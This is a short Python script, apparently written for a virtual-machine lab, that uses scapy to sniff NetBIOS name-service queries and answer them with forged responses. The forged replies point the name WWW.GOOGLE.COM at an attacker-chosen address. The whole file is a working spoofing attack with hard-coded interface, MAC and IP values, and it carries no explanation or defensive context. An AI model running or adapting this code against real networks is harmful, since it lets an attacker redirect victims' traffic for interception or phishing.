from scapy.all import * 

def processPkt(packet):
    scapyPkt = packet
    if scapyPkt.haslayer(NBNSQueryRequest):
        try:
            packet = modifyPkt(scapyPkt)
        except IndexError:
            print("Error")
            pass
    sendp(packet, loop = 0, verbose = 2)

def modifyPkt(packet):
    etherL = Ether(dst = "08:00:27:b7:c4:af", src = "08:00:27:D0:25:4B")
    ipL = IP(src = "192.168.56.103", dst = "192.168.56.101")
    udpL = UDP(sport = packet[UDP].dport, dport = packet[UDP].sport)
    nbnsResL = NBNSQueryResponse(ANCOUNT=1, FLAGS = 0x8500, NAME_TRN_ID= packet[NBNSQueryRequest].NAME_TRN_ID, RR_NAME = "WWW.GOOGLE.COM",SUFFIX = packet[NBNSQueryRequest].SUFFIX, NB_ADDRESS ="192.168.56.102", QDCOUNT=0, NSCOUNT=0, ARCOUNT=0)
    packet = etherL / ipL / udpL / nbnsResL    
    return packet



def start_dns_spoofing_local():
    try:
        sniff(prn = processPkt, lfilter = lambda x: x.haslayer(NBNSQueryRequest), iface = "enp0s3")
    except KeyboardInterrupt:
        print("END")

start_dns_spoofing_local()